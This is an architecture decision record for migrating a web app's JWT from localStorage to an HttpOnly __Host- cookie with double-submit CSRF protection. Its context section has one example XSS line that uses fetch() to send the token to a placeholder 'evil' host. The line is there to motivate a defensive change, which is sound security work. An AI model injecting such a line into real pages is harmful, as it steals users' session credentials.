# ADR 0002: Migrate Auth Token from localStorage to HttpOnly Cookie

- **Status**: Complete (Phase E)
- **Date**: 2026-04-14 (proposed), 2026-04-16 (Phase B), 2026-04-19 (Phase C–E)
- **Deciders**: Kootenai maintainers

## Context

Today the API issues a JWT on login that the frontend stashes in `localStorage` (`auth_token`) and echoes back on every request as `Authorization: Bearer <token>`. This is the dominant SPA pattern but has two concrete risks:

1. **XSS token exfiltration.** Any script that runs in the origin can read `localStorage.getItem('auth_token')` and exfiltrate it. We have DOMPurify in place for Markdown rendering (see `web/src/utils/renderMarkdown.ts`) and ESLint gates on `v-html`, but the attack surface is the entire dependency tree (every `npm install` is a supply-chain vector; see `docs/big-audit.md`). A token in localStorage is one `fetch('https://evil/?' + localStorage.auth_token)` away from compromise.
2. **Token handling in app code.** Every network path has to thread the token through axios interceptors, refresh logic, and cross-tab sync (`storage` event). Getting any of this wrong — logging the header, attaching it on a cross-origin call, forgetting a refresh path — leaks credentials.

`HttpOnly; Secure; SameSite=Lax` cookies address (1) directly: the browser stores the token where JS can't touch it. (2) is mitigated because the browser attaches the cookie automatically — app code stops carrying the token through its own hands.

## Decision

Migrate the auth token from `localStorage` + `Authorization` header to an `HttpOnly; Secure; SameSite=Lax` cookie named `__Host-auth_token`. Implement cross-cutting CSRF protection via the double-submit cookie pattern.

### Scope

- **In scope.** Web UI (`web/`) auth paths: login, logout, refresh, `/auth/me`, OAuth2 callback. Go API (`api/internal/auth/`) middleware, login handler, refresh handler, OAuth2 callback handler. CSRF middleware. Tests in both trees.
- **Out of scope for this ADR.** The `labctl` CLI — it's a server-to-server/script tool and will continue to use Bearer tokens it obtains via `/auth/login`. The backend will accept BOTH cookie and Bearer tokens throughout the migration and beyond.

### Backend changes (`api/`)

1. **New middleware `auth.CookieOrBearer`.**
   - Prefer `__Host-auth_token` cookie.
   - Fall back to `Authorization: Bearer <token>` header (for `labctl` and backwards compat).
   - Wire as the default HTTP auth middleware in `api/internal/server/auth.go`.
2. **Login handler sets the cookie** alongside returning the token in the JSON body (keeps `labctl` working). Attributes: `HttpOnly=true`, `Secure=true` (when `X-Forwarded-Proto: https` or `TLS != nil`), `SameSite=Lax`, `Path=/`, `Name="__Host-auth_token"` (the `__Host-` prefix enforces `Secure` + `Path=/` + no `Domain` at the browser level).
3. **Logout handler clears the cookie** via `Set-Cookie: __Host-auth_token=; Max-Age=0; ...`.
4. **Refresh handler rotates the cookie.**
5. **OAuth2 callback** stops redirecting with `#token=...` URL fragments. Instead, the callback sets the cookie server-side and redirects to a clean frontend URL (`/oauth2/success` or `/`).
6. **CSRF middleware (double-submit token).**
   - On login/refresh, set a non-HttpOnly cookie `csrf_token=<random>` (`Secure`, `SameSite=Lax`).
   - Require a matching `X-CSRF-Token: <value>` header on every state-changing request (`POST`, `PUT`, `PATCH`, `DELETE`).
   - Safe methods (`GET`, `HEAD`, `OPTIONS`) are not gated.
   - Middleware reads the cookie, compares against the header, rejects mismatches with 403.
7. **Tests.** All `req.Header.Set("Authorization", "Bearer "+token)` sites (70+) keep working. Add cookie-variant tests for the middleware, login, logout, refresh, and OAuth2 paths.

### Frontend changes (`web/`)

1. **Axios instance.** Set `withCredentials: true` on `api/config.ts`. This opts the browser into sending the `__Host-auth_token` cookie with every same-origin XHR.
2. **CSRF header.** An axios request interceptor reads the `csrf_token` cookie and attaches it as `X-CSRF-Token` on mutating methods. (Browsers expose this cookie to JS because it is NOT `HttpOnly`.)
3. **Auth store.**
   - Remove `TOKEN_KEY`, `USER_KEY`, `MUST_CHANGE_PASSWORD_KEY` localStorage writes for the token. The user object and `mustChangePassword` flag can stay in localStorage (they're non-secret) OR move to the server via `/auth/me` on app init.
   - `isAuthenticated` becomes a computed that's `true` iff `/auth/me` returned a user — the token is invisible to the store now.
   - Remove the `storage` event cross-tab sync. Replace with a `BroadcastChannel('auth')` that posts `{ type: 'login' | 'logout' }` so sibling tabs can call `fetchCurrentUser()` or clear local state.
4. **OAuth2 callback.** Delete `extractOAuth2Token`, `extractOAuth2Error`, `clearOAuth2Hash`. The OAuth2 success route just calls `fetchCurrentUser()` on mount (cookie is already set).
5. **Router.** No changes — `requiresAuth` still keys on `isAuthenticated`.
6. **Tests.** Auth store tests no longer poke `localStorage`; they assert against the axios interceptor's outbound headers. Add a CSRF interceptor test.

### Migration strategy

1. **Phase A (this session — prep).** Land the ADR. Add a same-origin guard to the axios auth interceptor so the Bearer token cannot be attached to cross-origin URLs even by mistake. Document `withCredentials` gate + CSRF interceptor as TODOs in the axios config.
2. **Phase B (backend).** Ship the cookie-or-Bearer middleware + cookie-setting login/logout/refresh + CSRF middleware behind a feature flag (`AUTH_COOKIE_MODE=true`). Dark-launch: both flows work. Test suite runs both.
3. **Phase C (frontend).** Ship `withCredentials: true` + CSRF interceptor + `BroadcastChannel` cross-tab sync + remove localStorage token writes. Gated by a build-time flag initially.
4. **Phase D (cutover).** Flip the build flag. Run for one release.
5. **Phase E (cleanup).** Remove the localStorage token code paths entirely. Retain the `Authorization: Bearer` middleware branch for `labctl`.

## Consequences

### Positive

- JS-accessible token storage is eliminated for the web UI. An XSS bug in a dependency can no longer exfiltrate the auth token with a single `localStorage.auth_token` read.
- Request code stops threading a secret through userland: the cookie rides along automatically.
- OAuth2 callback stops putting tokens in URL fragments (which were previously visible in Referer headers, window.location logs, and some monitoring tools).

### Negative

- CSRF is now a first-class concern. The double-submit token adds a narrow attack window during cookie setup — mitigated by `SameSite=Lax`, which blocks most cross-site POSTs by default.
- `withCredentials` + CORS: any dev setup that proxies the API from a different origin must advertise `Access-Control-Allow-Credentials: true` AND use a concrete `Access-Control-Allow-Origin` (not `*`). The nginx config in `deploy/nginx.conf` already proxies same-origin, but local dev (`vite --port 3000` hitting `<INFRA_IP>:8080`) will need CORS tightening.
- `BroadcastChannel` is not supported on Safari ≤ 15.4. For those, the fallback is to re-check auth on `visibilitychange` (the browser already fires it when a tab regains focus).
- Rolling back requires coordination: once the backend cookie flow is live, clients that sent Bearer-only tokens from stale builds must still work (which is why the middleware accepts both).

### Neutral

- `labctl` is unaffected. It continues to obtain a token from `/auth/login` and send `Authorization: Bearer`.
- Existing Bearer tests remain valuable — they exercise the fallback path.

## References

- [OWASP — Session Management Cheat Sheet (Cookie Attributes)](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
- [OWASP — CSRF Prevention Cheat Sheet (Double Submit Cookie)](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [MDN — Set-Cookie attributes (`__Host-` prefix, `SameSite`)](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie)
- Existing auth middleware: `api/internal/auth/auth.go`
- Current frontend auth store: `web/src/stores/auth.ts`
